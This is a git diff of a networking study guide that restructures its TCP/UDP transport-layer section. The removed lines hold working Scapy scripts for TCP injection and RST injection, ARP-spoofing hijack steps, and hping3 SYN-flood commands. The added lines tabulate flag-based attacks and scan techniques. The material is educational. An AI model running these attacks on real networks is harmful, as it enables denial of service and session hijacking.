@@ -153,13 +153,13 @@
   - [13.9 NAT (Network Address Translation)](#139-nat-network-address-translation)
   - [13.10 IPv4 Limitations](#1310-ipv4-limitations)
   - [13.11 Routing Basics](#1311-routing-basics)
-    - [13.11.1 Distance Vector Routing (DVR)](#13111-distance-vector-routing-dvr)
-    - [13.11.2 Link State Routing (LSR)](#13112-link-state-routing-lsr)
-    - [13.11.3 Path Vector Routing (PVR)](#13113-path-vector-routing-pvr)
-    - [13.11.4 Hierarchical Routing & Autonomous Systems](#13114-hierarchical-routing--autonomous-systems)
-    - [13.11.5 RIP (Routing Information Protocol)](#13115-rip-routing-information-protocol)
-    - [13.11.6 OSPF (Open Shortest Path First)](#13116-ospf-open-shortest-path-first)
-    - [13.11.7 BGP (Border Gateway Protocol)](#13117-bgp-border-gateway-protocol)
+    - [Distance Vector Routing (DVR)](#distance-vector-routing-dvr)
+    - [Link State Routing (LSR)](#link-state-routing-lsr)
+    - [Path Vector Routing (PVR)](#path-vector-routing-pvr)
+    - [Hierarchical Routing & Autonomous Systems](#hierarchical-routing--autonomous-systems)
+    - [RIP (Routing Information Protocol)](#rip-routing-information-protocol)
+    - [OSPF (Open Shortest Path First)](#ospf-open-shortest-path-first)
+    - [BGP (Border Gateway Protocol)](#bgp-border-gateway-protocol)
 
 - [14. IPv6 — Next Generation IP](#14-ipv6--next-generation-ip)
   - [14.1 Overview & History](#141-overview--history)
@@ -3942,7 +3942,7 @@ Time ──|────|────|────|────|────|─
 
 ##### **Routing & Path Selection**
 
-> 📖 *For comprehensive routing coverage including protocols (RIP, OSPF, BGP), algorithms, and routing tables, see [Section 13.11 Routing Basics](#1311-routing-basics) through [Section 13.11.7 BGP](#13117-bgp-border-gateway-protocol).*
+> 📖 *For comprehensive routing coverage including protocols (RIP, OSPF, BGP), algorithms, and routing tables, see [Section 13.11 Routing Basics](#1311-routing-basics) through [BGP](#bgp-border-gateway-protocol).*
 
 - **Routing Tables:** Store destination prefixes with next hop and metrics.
 - **Static Routing:** Simple and predictable but not adaptive.
@@ -3956,7 +3956,7 @@ Time ──|────|────|────|────|────|─
 
 ##### **Dynamic Routing Protocols**
 
-> 📖 *For comprehensive routing protocol coverage, see [Section 13.11.1 Distance Vector Routing](#13111-distance-vector-routing-dvr), [Section 13.11.6 OSPF](#13116-ospf-open-shortest-path-first), and [Section 13.11.7 BGP](#13117-bgp-border-gateway-protocol).*
+> 📖 *For comprehensive routing protocol coverage, see [Distance Vector Routing](#distance-vector-routing-dvr), [OSPF](#ospf-open-shortest-path-first), and [BGP](#bgp-border-gateway-protocol).*
 
 - **OSPF:** Link‑state protocol using areas and LSAs with SPF calculations.
 - **OSPFv2:** IPv4 version; supports DR/BDR for multi‑access segments.
@@ -4198,539 +4198,479 @@ $$
 
 #### 9.3.4 **Layer 4: Transport Layer**
 
-**Primary Function:** End-to-end reliable data delivery between applications
+The Transport Layer is responsible for **end-to-end communication** between processes on two hosts. It provides reliable (TCP) or best-effort (UDP) delivery, port addressing, and multiplexing of multiple connections on a single IP.
 
-**Position & Purpose**
-- **Location:** Above Network Layer (IP), below Application Layer.
-- **Core role:** **Process‑to‑process delivery** (targets the correct application).
-- **Logical connection:** Creates an end‑to‑end “pipe” between sender and receiver apps.
+---
 
-**Why We Need the Transport Layer**
-- IP is **best‑effort** (no guarantees of delivery/order).
-- IP identifies **hosts**, not applications.
-- Transport adds **reliability, ordering, and port‑based app identification**.
+##### Transmission Control Protocol (TCP)
 
-**Key Services**
+**Overview:**
+TCP is a **connection-oriented, reliable, ordered, error-checked** transport protocol. It guarantees that all data arrives completely, in order, and without corruption.
 
-**A) Process‑to‑Process Communication (Ports)**
-- **Port numbers** identify specific applications.
-- **Socket = IP + Port** (unique process endpoint).
-
-**B) Segmentation & Reassembly**
-- **Sender:** Splits app data into **segments**, adds headers.
-- **Receiver:** Reassembles segments and delivers to the app.
-
-**C) Multiplexing & Demultiplexing**
-- **Multiplexing:** Combine data from multiple apps into one stream.
-- **Demultiplexing:** Deliver segments to the correct app by port.
-
-**D) Flow Control**
-- Prevents sender from overwhelming receiver (e.g., TCP windowing).
-
-**E) Error Control (Reliability)**
-- **Sequence numbers** detect loss/out‑of‑order.
-- **ACKs** trigger retransmission.
-- **Checksums** detect corruption.
-
-**F) Congestion Control**
-- Reduces sending rate when the network is congested.
-
-##### **TCP Mechanics**
-
-> 📖 *For detailed TCP coverage including segment structure, header format, handshake, state machine, and attack vectors, see the [TCP Protocol](#tcp-protocol) section below.*
-
-- **TCP Header:** Source/destination ports, sequence and acknowledgment numbers, flags, window size, and options.
-- **Flags:** SYN, ACK, FIN, RST, PSH, URG define connection state changes.
-- **Handshake & Teardown:** Establishes and closes connections reliably.
-- **State Machine:** LISTEN, SYN_SENT, SYN_RECEIVED, ESTABLISHED, FIN_WAIT, CLOSE_WAIT, CLOSED.
-- **Window Scaling:** Extends window size for high‑bandwidth paths.
-- **Options:** MSS, SACK, timestamps, scaling.
-- **TIME_WAIT:** Ensures late segments don't corrupt new connections; too many can exhaust ephemeral ports.
-- **Congestion Control (High‑Level):** Slow start, congestion avoidance, and fast recovery shape the sending rate.
-- **Flow Control:** Receiver‑advertised window prevents buffer overflow at the receiver.
-- **RTT & RTO:** Round‑trip time estimates drive retransmission timeouts.
-- **SACK:** Selective acknowledgment helps recover from multiple losses efficiently.
-- **Nagle/Delayed ACKs:** Reduce small packets but can add latency for interactive flows.
-
-##### **UDP Characteristics**
-
-> 📖 *For detailed UDP coverage including header format and use cases, see the [UDP Protocol](#udp-protocol) section below.*
-
-- Lightweight header, no handshake, no reliability.
-- Common in DNS, DHCP, NTP, RTP, and streaming.
-- Vulnerable to amplification misuse at the protocol level (conceptual).
-- **Statelessness:** Reliability, ordering, and recovery are pushed to applications.
-- **Checksum Use:** Optional in IPv4, mandatory in IPv6; protects against payload corruption.
-
-##### **Port & Service Enumeration (Conceptual)**
-
-- Common ports identify standard services. Understanding port exposure helps determine attack surface and firewall posture.
-
-##### **Scanning & Reconnaissance (Conceptual)**
-
-- SYN vs connect scans reveal different responses.
-- FIN/NULL/Xmas/ACK scans infer filtering without full connection.
-- UDP scans rely on ICMP responses and are less deterministic.
-- Timing controls trade stealth for speed.
-
-##### **Transport Layer Abuse Patterns (Conceptual)**
-
-- SYN floods target state tables.
-- Sequence prediction risks session integrity.
-- RST injection can tear down connections.
-- ACK flooding targets bandwidth and device resources.
-
-##### **TCP Session Hijacking & Connection Attacks — Deep Dive**
-
-TCP's reliance on predictable sequence numbers and lack of authentication makes it vulnerable to sophisticated attacks.
-
-**TCP Session Hijacking Overview:**
-
-Session hijacking allows an attacker to take over an established TCP connection between two parties.
-
-```
-Normal TCP Session:
-┌──────────┐          ┌──────────┐
-│  Client  │ <══════> │  Server  │
-│          │  SEQ/ACK │          │
-└──────────┘          └──────────┘
-
-Session Hijacked:
-┌──────────┐          ┌──────────┐          ┌──────────┐
-│  Client  │          │ Attacker │          │  Server  │
-│ (blocked)│    X     │ (MiTM)   │ <══════> │          │
-└──────────┘          └──────────┘          └──────────┘
-                           │
-                    Takes over session
-                    with correct SEQ/ACK
-```
-
-**TCP Sequence Number Prediction:**
-
-To inject packets, attacker must predict or know the sequence number.
-
-```
-TCP Header Sequence Fields:
-┌─────────────────────────────────────────────────────────────────┐
-│  Sequence Number (32 bits) - Position of first byte in segment │
-├─────────────────────────────────────────────────────────────────┤
-│  Acknowledgment Number (32 bits) - Next expected byte          │
-└─────────────────────────────────────────────────────────────────┘
-
-Session State:
-Client → Server: SEQ=1000, ACK=5000
-Server → Client: SEQ=5000, ACK=1100
-Client → Server: SEQ=1100, ACK=5100
-...
-
-Attacker must know:
-1. Source IP and port
-2. Destination IP and port  
-3. Current sequence number (within window)
-4. Current acknowledgment number
-```
-
-**Blind TCP Session Hijacking:**
-
-Without seeing traffic (no MITM), attacker must guess sequence numbers.
-
-```bash
-# Using Scapy to attempt blind injection
-from scapy.all import *
-
-# Attacker doesn't know exact SEQ, tries window guessing
-target_ip = "192.168.1.100"
-target_port = 80
-source_ip = "192.168.1.5"  # Spoofed client IP
-source_port = 12345         # Must match established session
-
-# Try sequence numbers within window (modern systems use ISN randomization)
-for seq in range(estimated_seq - 10000, estimated_seq + 10000, 1000):
-    pkt = IP(src=source_ip, dst=target_ip)/\
-          TCP(sport=source_port, dport=target_port, 
-              seq=seq, ack=estimated_ack, flags="PA")/\
-          "INJECTED DATA"
-    send(pkt)
-```
-
-**Modern Defenses Against Sequence Prediction:**
-- **ISN Randomization:** Initial Sequence Numbers are randomly generated (RFC 6528)
-- **TCP Timestamps:** Add timestamp to validation
-- **Challenge ACK (RFC 5961):** Server sends challenge ACK for off-window segments
-
-**RST Injection Attack:**
-
-Force connection termination by injecting RST packet with correct sequence.
-
-```bash
-# RST injection using Scapy
-from scapy.all import *
-
-def rst_attack(target_ip, target_port, client_ip, client_port, seq):
-    """Inject RST to tear down connection"""
-    rst_pkt = IP(src=client_ip, dst=target_ip)/\
-              TCP(sport=client_port, dport=target_port, 
-                  flags="R", seq=seq)
-    send(rst_pkt, verbose=False)
-
-# For targeted attack, sniff to get correct SEQ
-def sniff_and_rst(pkt):
-    if TCP in pkt and pkt[TCP].dport == 80:
-        print(f"Injecting RST for SEQ: {pkt[TCP].seq}")
-        rst_attack(pkt[IP].dst, pkt[TCP].dport, 
-                  pkt[IP].src, pkt[TCP].sport, 
-                  pkt[TCP].seq + len(pkt[TCP].payload))
-
-sniff(filter="tcp port 80", prn=sniff_and_rst)
-```
-
-**Use Cases for RST Injection:**
-- **DoS:** Tear down victim's connections
-- **Censorship:** (Great Firewall) Inject RST for blocked keywords
-- **Session Disruption:** Force re-authentication
-
-**TCP Hijacking with ARP Spoofing (Full MITM):**
-
-Combined attack for complete session takeover.
-
-```bash
-# Complete TCP hijacking attack flow:
-
-# 1. ARP spoof to become MITM
-sudo arpspoof -i eth0 -t 192.168.1.5 192.168.1.1 &
-sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.5 &
-
-# 2. Enable forwarding (to maintain connectivity)
-echo 1 > /proc/sys/net/ipv4/ip_forward
-
-# 3. Sniff TCP session to track SEQ/ACK numbers
-# 4. Block original client (with RST or firewall rule)
-iptables -A FORWARD -s 192.168.1.5 -p tcp --dport 80 -j DROP
-
-# 5. Send packets with correct SEQ/ACK as the "client"
-# Now you ARE the client to the server
-```
-
-**TCP Covert Channels:**
-
-Hide data in TCP header fields.
-
-```
-Covert Channel Locations in TCP:
-- ISN (Initial Sequence Number) - 32 bits of covert data per connection
-- Urgent Pointer - 16 bits when URG flag not set
-- Timestamps - 8 bytes per packet
-- Reserved bits - 3 bits
-- Window size manipulation
-
-# Example: ISN covert channel
-# Encode data in Initial Sequence Number
-import struct
-
-secret = b"DATA"
-isn = struct.unpack("!I", secret)[0]  # Convert bytes to 32-bit int
-# Use this ISN when establishing connections
-```
-
-**Tools for TCP Attacks:**
-
-| Tool | Purpose |
-|------|---------|
-| **hping3** | Craft custom TCP packets, RST injection |
-| **Scapy** | Python packet manipulation |
-| **Ettercap** | ARP spoof + session hijacking |
-| **hunt** | Classic TCP session hijacking tool |
-| **Shijack** | TCP session hijacking |
-| **tcpkill** | RST injection to kill connections |
-
-```bash
-# hping3 examples
-# SYN flood
-hping3 -S --flood -V -p 80 target.com
-
-# RST injection
-hping3 -R -s 12345 -p 80 -M 1000 target.com
-
-# Custom packet crafting
-hping3 -S -p 80 -s 12345 -M 1000 -L 5000 target.com
-
-# tcpkill (from dsniff)
-sudo tcpkill -i eth0 host 192.168.1.100
-```
-
-**TCP Attack Defenses:**
-
-| Defense | Description |
+| Feature | TCP Behavior |
 |---------|-------------|
-| **Encryption (TLS)** | Protects payload, attacker sees encrypted data |
-| **VPN/IPsec** | Encrypts entire TCP session |
-| **ISN Randomization** | Makes sequence prediction difficult |
-| **TCP MD5 Signatures** | BGP sessions use MD5 authentication |
-| **RFC 5961 Mitigations** | Challenge ACK for suspicious segments |
-| **ARP Spoofing Defenses** | DAI, static ARP, port security |
-| **Network Segmentation** | Limit attacker's MITM opportunity |
+| Connection | Requires handshake (connection-oriented) |
+| Reliability | ACKs every segment; retransmits lost ones |
+| Ordering | Sequence numbers guarantee in-order delivery |
+| Error Checking | Checksum covers header and data |
+| Flow Control | Sliding window prevents receiver overflow |
+| Congestion Control | Reduces send rate under network congestion |
+| Header Overhead | Higher - 20 to 60 bytes per segment |
+| Use Cases | HTTP/S, SSH, FTP, SMTP, databases |
 
-##### **Transport Filtering**
+---
 
-- Stateless vs stateful firewall behavior and how fragmentation or timing can impact detection (conceptual).
-- **Connection Tracking:** Stateful devices maintain session tables that can be stressed under heavy load.
-- **Timeouts:** Idle and half‑open timeouts affect reliability and troubleshooting outcomes.
+##### TCP Segment Structure
 
-**Port Numbers:**
-- 16-bit numbers (0-65535)
-- **Well-Known Ports:** 0-1023 (require root/admin)
-- **Registered Ports:** 1024-49151 (assigned by IANA)
-- **Dynamic/Private Ports:** 49152-65535 (ephemeral)
+A TCP segment: **header** (minimum 20 bytes) + **data payload**.
 
-**Socket Address:** IP + Port uniquely identifies a process endpoint.
-
-**Port Categories (IANA)**
-
-| Category | Range | Description | Examples |
-| --- | --- | --- | --- |
-| Well‑Known | 0–1023 | Core system services | HTTP(80), HTTPS(443), SSH(22), DNS(53) |
-| Registered | 1024–49151 | Assigned to apps/vendors | RDP(3389), DB/Apps |
-| Dynamic/Ephemeral | 49152–65535 | Temporary client ports | Browser source ports |
-
-**Protocols:**
-
-**Connectionless vs Connection‑Oriented**
-
-**Connectionless (UDP)**
-- No setup/handshake; each packet is independent.
-- **No reliability**, **no ordering**, **no flow/congestion control**.
-- **Best for:** Real‑time streaming, gaming, broadcast.
-
-**Connection‑Oriented (TCP)**
-- Setup → Data Transfer → Teardown.
-- **Reliable**, **ordered delivery**, **flow & congestion control**.
-- **Best for:** Web, email, file transfer.
-
-**TCP (Transmission Control Protocol):**
-- **Connection-Oriented:** Three-way handshake (SYN, SYN-ACK, ACK)
-- **Reliable:** Guarantees delivery, in-order, no duplicates
-- **Flow Control:** Sliding window mechanism
-- **Congestion Control:** Slow start, congestion avoidance
-- **Error Recovery:** Acknowledgments, retransmissions
-- **Use Cases:** HTTP, HTTPS, FTP, SSH, email
-- **Overhead:** Higher (20-60 byte header)
-
-**TCP Overview & Lifecycle**
-- **Connection‑oriented** and **reliable** (ordered, accurate delivery).
-- **Phases:**
-  - **Connection setup** (handshake)
-  - **Data transfer** (flow + error control)
-  - **Teardown** (close session, free resources)
-
-**Key Services**
-
-**A) Stream Delivery**
-- Byte‑oriented **stream** (virtual tube) rather than independent packets.
-- Ensures byte order (e.g., byte 100 → byte 101).
-
-**B) Sending & Receiving Buffers**
-- Smooths speed differences between app and network.
-- **Send buffer:** unsent data + sent‑unACKed data retained for retransmit.
-- **Receive buffer:** holds data until app reads it (circular buffer).
-- **Visualization (common teaching model):**
-  - White cells = free buffer space
-  - Blue cells = sent but not yet ACKed (must be retained for possible retransmit)
-  - Black cells = written by app but not yet transmitted
-
-**C) Segmentation**
-- Splits byte stream into **segments** with TCP headers.
-
-**D) Full‑Duplex**
-- Simultaneous send/receive in both directions.
-
-**Reliability Mechanisms (Brief)**
-- **Sequence numbers** (order + loss detection)
-- **ACKs** (confirm received bytes)
-- **Checksums** (corruption detection)
-- **Flow control** (receiver‑advertised window)
-
-**TCP Error Control (Details)**
-
-**A) Checksum (Detection)**
-- Sender computes checksum over header + data; receiver recomputes.
-- Mismatch → segment discarded, **no ACK**, retransmission triggered.
-
-**B) Acknowledgments (ACKs)**
-- **Cumulative ACK (default):** “Received everything up to byte X.”
-- **Cumulative ACK limitation:** if segment 3 is missing but 4 and 5 arrive, receiver still ACKs only up to 2.
-- **Selective ACK (SACK):** “Missing X, but have Y–Z.” (TCP option)
-- **Benefit:** Avoids unnecessary retransmissions.
-
-**C) Retransmission (Correction)**
-- **RTO (Retransmission Timeout):** If timer expires before ACK, resend.
-- **Dynamic RTO:** Adjusted using RTT measurements.
-- **Fast Retransmit:** 3 duplicate ACKs → retransmit immediately.
-- **Why it works:** duplicate ACKs imply later packets arrived, so path is alive and one segment is likely missing.
-
-**TCP Connection Management**
-
-**Phases**
-- **Establishment** → **Data Transfer** → **Termination**
-
-**Connection States (Concept)**
-- **Passive open (Server):** Listen for connections.
-- **Active open (Client):** Initiate connection to IP/port.
-
-**3‑Way Handshake (Setup)**
-1. **SYN (Client → Server):** Client sends SYN with ISN (client enters **SYN_SENT**).
-2. **SYN‑ACK (Server → Client):** ACK = ISN+1, server sends its own ISN (server enters **SYN_RCVD**).
-3. **ACK (Client → Server):** ACK = server ISN+1; both enter **ESTABLISHED** (may include data).
-
-**Handshake Example (SEQ/ACK)**
-
-| Step | Sender → Receiver | Flags | SEQ | ACK | Meaning |
-| --- | --- | --- | --- | --- | --- |
-| 1 | Client → Server | SYN | 8000 | — | “My sequence starts at 8000.” |
-| 2 | Server → Client | SYN, ACK | 15000 | 8001 | “ACK 8001, my seq starts at 15000.” |
-| 3 | Client → Server | ACK | 8001 | 15001 | “ACK 15001, connection open.” |
-
-**Note:** SYN consumes **1 sequence number**.
-
-**Sequence Number Consumption Rule**
-- **SYN** and **FIN** each consume one sequence number even with no payload.
-- A **pure ACK** (no payload, no SYN/FIN) does not consume sequence numbers.
-
-**4‑Way Teardown (Full Duplex)**
-1. **FIN (Client → Server):** Client finished sending.
-2. **ACK (Server → Client):** Acknowledges client FIN.
-3. **FIN (Server → Client):** Server finished sending.
-4. **ACK (Client → Server):** Connection closed.
-
-**Teardown Example (Half‑Close)**
-
-| Step | Sender → Receiver | Flags | SEQ | ACK | Meaning |
-| --- | --- | --- | --- | --- | --- |
-| 1 | Client → Server | FIN, ACK | x | y | Client done sending (FIN_WAIT_1). |
-| 2 | Server → Client | ACK | y | x+1 | Client done acknowledged (FIN_WAIT_2). |
-| 3 | Server → Client | FIN, ACK | y | x+1 | Server done (LAST_ACK). |
-| 4 | Client → Server | ACK | x+1 | y+1 | Connection closed. |
-
-**Half‑Close State**
-- After client FIN, client **can’t send** but can still **receive**.
-- Application sees **EOF** when peer sends FIN.
-
-**Data Transfer Example (SEQ/ACK)**
-
-| Step | Action | Flags | SEQ | ACK | Length | Explanation |
-| --- | --- | --- | --- | --- | --- | --- |
-| 1 | Client sends Data 1 | PSH, ACK | 8001 | 15001 | 1000 | Bytes 8001–9000 |
-| 2 | Client sends Data 2 | PSH, ACK | 9001 | 15001 | 1000 | Bytes 9001–10000 |
-| 3 | Server ACKs | ACK | 15001 | 10001 | 0 | Next expected byte 10001 |
-
-**Notes**
-- ACKs can be **piggybacked** on outgoing data.
-- Receiver advertises **Window Size** in every packet.
-
-**Security Note: SYN Flood**
-- Server allocates resources on SYN‑ACK.
-- Attackers send many SYNs without final ACK → **half‑open** connections → DoS.
-
-**TCP Segment Header:**
 ```
-[Src Port|Dst Port|Seq#|Ack#|Flags|Window|Checksum|Urgent|Options|Data]
-  2 bytes  2 bytes  4B   4B   1B    2B     2B       2B      var    var
+ 0                   1                   2                   3
+ 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|          Source Port          |       Destination Port        |
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                        Sequence Number                        |
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                    Acknowledgment Number                      |
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|  Data |       |U|A|P|R|S|F|                                   |
+| Offset|  Res. |R|C|S|S|Y|I|            Window Size            |
+|       |       |G|K|H|T|N|N|                                   |
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|           Checksum            |         Urgent Pointer        |
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                    Options (if Data Offset > 5)               |
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                          Payload Data                         |
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 ```
 
-**TCP Segment Structure & Header Format**
+**Field Reference:**
 
-**Overview**
-- TCP segment = **Header + Data (Payload)**.
-- **Header size:** 20–60 bytes (larger than UDP due to reliability + control).
+| Field | Size | Description |
+|-------|------|-------------|
+| Source Port | 16 bits | Sender's port (1 to 65535) |
+| Destination Port | 16 bits | Receiver's port |
+| Sequence Number | 32 bits | Position of first byte in this segment |
+| Acknowledgment Number | 32 bits | Next expected byte from the remote side |
+| Data Offset | 4 bits | Header length in 32-bit words (min 5 = 20 bytes) |
+| Reserved | 6 bits | Must be zero |
+| Control Flags | 6 bits | URG, ACK, PSH, RST, SYN, FIN |
+| Window Size | 16 bits | Receiver buffer available (flow control) |
+| Checksum | 16 bits | Error detection over header + data |
+| Urgent Pointer | 16 bits | Offset to urgent data (URG flag must be set) |
+| Options | Variable | MSS, SACK, timestamps, window scaling |
 
-**Byte‑Oriented Numbering**
-- TCP numbers **every byte** in the stream (not just segments).
-- **Initial Sequence Number (ISN):** Random 32‑bit value ($0$ to $2^{32}-1$).
+**Important Header/Path Relationships:**
+- **MSS (Maximum Segment Size):** Largest TCP payload per segment (announced in SYN options).
+- **MTU (Maximum Transmission Unit):** Largest Layer 3 packet size on a link.
+- **Typical Ethernet math:** MTU 1500 -> IPv4 header 20 + TCP header 20 => MSS 1460 bytes.
+- If TCP payload exceeds path MTU behavior, fragmentation or black-hole MTU issues can appear.
 
-**Header Fields (Detailed)**
-- **Source Port (16 bits)**
-- **Destination Port (16 bits)**
-- **Sequence Number (32 bits):**
-  - If **SYN** set → ISN.
-  - Otherwise → sequence number of first data byte.
-- **Acknowledgment Number (32 bits):**
-  - Valid when **ACK** set.
-  - Next expected byte (if last byte = $N$, ACK = $N+1$).
-- **Data Offset (4 bits):** Header length in 32‑bit words.
-  - Min = 5 (20 bytes), Max = 15 (60 bytes).
-- **Reserved (6 bits):** Set to 0.
-- **Control Flags (6 bits):**
-  - **URG:** Urgent pointer valid
-  - **ACK:** Acknowledgment valid
-  - **PSH:** Push to application immediately
-  - **RST:** Reset/abort connection
-  - **SYN:** Start connection (sync)
-  - **FIN:** Graceful close
-- **Window Size (16 bits):** Receiver’s available buffer (flow control).
-- **Checksum (16 bits):** Error detection over header + data + pseudo‑header.
-- **Urgent Pointer (16 bits):** End of urgent data (valid if URG set).
-- **Options (0–40 bytes):** MSS, Window Scale, Timestamps, etc.
-- **Padding:** Aligns header to 32‑bit boundary.
+---
 
-**TCP Flags:**
-- SYN: Synchronize sequence numbers (connection setup)
-- ACK: Acknowledgment
-- FIN: Finish (connection teardown)
-- RST: Reset connection
-- PSH: Push data immediately
-- URG: Urgent data
+##### TCP Flags (Control Bits)
 
-**UDP (User Datagram Protocol):**
-- **Connectionless:** No handshake, no connection state
-- **Unreliable:** No delivery guarantee, no ordering, possible loss/duplication
-- **Fast:** Minimal overhead (8-byte header)
-- **No Flow/Congestion Control:** Application responsibility
-- **Use Cases:** DNS, DHCP, VoIP, video streaming, online gaming, SNMP
-- **Trade-off:** Speed vs reliability
+TCP flags are 1-bit fields controlling connection state:
 
-**Why Use UDP?**
-- **Low latency:** No handshake or retransmissions.
-- **Small header:** 8 bytes (more payload, less overhead).
-- **Real‑time friendly:** Better to drop a frame than wait.
+| Flag | Full Name | Hex | Purpose |
+|------|-----------|-----|---------|
+| **URG** | Urgent | 0x20 | Urgent data present; urgent pointer valid |
+| **ACK** | Acknowledgment | 0x10 | Ack number field is valid |
+| **PSH** | Push | 0x08 | Push data to application immediately (no buffering) |
+| **RST** | Reset | 0x04 | Abort connection immediately |
+| **SYN** | Synchronize | 0x02 | Initiate connection; sync sequence numbers |
+| **FIN** | Finish | 0x01 | No more data from sender; graceful close |
+| **ECE** | ECN-Echo | -- | Congestion notification (RFC 3168) |
+| **CWR** | Congestion Window Reduced | -- | Sender reduced congestion window |
 
-**UDP Header (8 Bytes)**
-- **Source Port (16 bits)**
-- **Destination Port (16 bits)**
-- **Length (16 bits):** Header + Data (max 65,535 bytes)
-- **Checksum (16 bits):** Error detection
-  - Optional in IPv4, **mandatory in IPv6**
+**Common Flag Combinations:**
 
-**Pseudo Header (Checksum)**
-- UDP borrows **Src IP, Dst IP, Protocol** from IP header for checksum.
-- Ensures the segment belongs to the correct endpoint.
+| Flags | Meaning |
+|-------|---------|
+| SYN | Step 1 of handshake - connection request |
+| SYN + ACK | Step 2 of handshake - server accepts |
+| ACK | Acknowledgment of data received |
+| PSH + ACK | Push data immediately + acknowledge previous |
+| FIN + ACK | Graceful close initiation |
+| RST | Abrupt reset (port closed or error) |
+| RST + ACK | Abrupt reset in reply to a SYN |
 
-**Common Applications**
-- DNS, DHCP, VoIP, live streaming, gaming, SNMP, multicast
+**Security Abuse of TCP Flags:**
 
-**Limitations**
-- No built‑in stream/reassembly across packets.
-- Loss handled by the application (best‑effort delivery).
+| Technique | Flag(s) | How It Works |
+|-----------|---------|--------------|
+| **SYN Flood** | SYN | Send thousands of SYNs without completing handshake - exhaust server's SYN_RCVD table |
+| **RST Injection** | RST | Forge RST packet - kill legitimate TCP session mid-flow |
+| **FIN Scan** (Nmap) | FIN | FIN to closed port - RST returned; stealthy port detection |
+| **XMAS Scan** | FIN+PSH+URG | All bits lit up; RFC-compliant closed ports return RST |
+| **NULL Scan** | (none) | No flags; closed ports return RST |
+| **ACK Scan** | ACK | Maps firewall rules: which ACKs get through? |
+| **Idle Scan** | SYN+ACK / RST | Uses zombie host's IP ID increments for completely silent port scan |
 
-**SCTP (Stream Control Transmission Protocol):**
-- **Message‑oriented**, supports multi‑streaming and multi‑homing
-- Mix of reliability + lower overhead in certain use cases
+---
 
-**UDP Datagram Header:**
+##### TCP Three-Way Handshake
+
+Before any data flows, TCP establishes a connection using a **three-way handshake** that synchronizes sequence numbers on both sides.
+
 ```
-[Src Port|Dst Port|Length|Checksum|Data]
-  2 bytes  2 bytes 2 bytes 2 bytes  var
+   Client                              Server
+     |                                   |
+     |--- SYN (seq=1000) --------------->|   Step 1: Client initiates
+     |                                   |
+     |<-- SYN-ACK (seq=5000, ack=1001) --|   Step 2: Server accepts + syncs
+     |                                   |
+     |--- ACK (ack=5001) --------------->|   Step 3: Client confirms
+     |                                   |
+     |======= Connection Established ====|
+     |                                   |
+     |--- DATA ------------------------->|   Data transfer begins
 ```
 
-**Flow Control Mechanisms:**
-- **Stop-and-Wait:** Send one, wait for ACK
-- **Sliding Window:** Send multiple before ACK (more efficient)
-- **Window Size:** Number of bytes sender can transmit before ACK
+**Step 1 - SYN (Client to Server):**
+- SYN flag set; includes client's random **Initial Sequence Number (ISN)**
+- `SYN, seq=1000`
+- "I want to connect; my byte stream starts at 1000"
 
-**Example Issues:**
-- Port conflicts
-- Connection timeouts
-- Packet retransmission storms
-- Window size too small (poor performance)
-- Firewall blocking ports
+**Step 2 - SYN-ACK (Server to Client):**
+- SYN + ACK flags set
+- ACK = client ISN + 1 (the SYN consumed one sequence number)
+- Includes server's own random ISN
+- `SYN-ACK, seq=5000, ack=1001`
+- "Accepted; my stream starts at 5000; I received your byte 1000"
+
+**Step 3 - ACK (Client to Server):**
+- ACK flag set; ACK = server ISN + 1
+- `ACK, ack=5001`
+- "I got your byte 5000; we are connected"
+
+**Why Randomize ISNs?**
+Prevents **TCP Sequence Prediction Attacks** where an off-path attacker guesses sequence numbers to inject data. RFC 6528 mandates cryptographically random ISN generation.
+
+**Connection States During Handshake:**
+
+| State | Who | Meaning |
+|-------|-----|---------|
+| LISTEN | Server | Awaiting incoming SYN |
+| SYN_SENT | Client | SYN sent, awaiting SYN-ACK |
+| SYN_RECEIVED | Server | SYN-ACK sent, awaiting final ACK |
+| ESTABLISHED | Both | Connection active; data flows freely |
+
+**Operational Hardening (Server Side):**
+- Enable **SYN cookies** where available to reduce SYN flood impact.
+- Tune backlog queues and monitor half-open connection rates.
+- Rate-limit abusive SYN sources at edge firewall/load balancer.
+
+---
+
+##### TCP Connection Termination (4-Way FIN Teardown)
+
+TCP uses a **4-way handshake** for graceful close. Either side can initiate.
+
+```
+   Client                              Server
+     |                                   |
+     |--- FIN (seq=u) ------------------>|   Step 1: Client done sending
+     |                                   |
+     |<-- ACK (ack=u+1) -----------------|   Step 2: Server acknowledges
+     |                                   |
+     |   [Server finishes its sending]   |
+     |                                   |
+     |<-- FIN (seq=v) -------------------|   Step 3: Server done sending
+     |                                   |
+     |--- ACK (ack=v+1) --------------->|    Step 4: Client acknowledges
+     |                                   |
+     |======= Connection Closed =========|
+```
+
+**TIME_WAIT State:**
+After the final ACK, the initiating side enters `TIME_WAIT` for **2 x MSL** (Maximum Segment Lifetime, ~60s). Purpose:
+- Ensures final ACK reaches the server
+- Prevents stale packets from corrupting new connections on the same port pair
+
+**Common Teardown-Related States (Practical):**
+- `FIN_WAIT_1` / `FIN_WAIT_2`: Side initiated close and waits for peer progression.
+- `CLOSE_WAIT`: Peer closed, local app still has not closed its socket.
+- `LAST_ACK`: Local side sent FIN and waits for final ACK.
+- Excessive `CLOSE_WAIT` often indicates application/socket handling bugs.
+
+**RST vs FIN:**
+
+| Method | Type | Use Case |
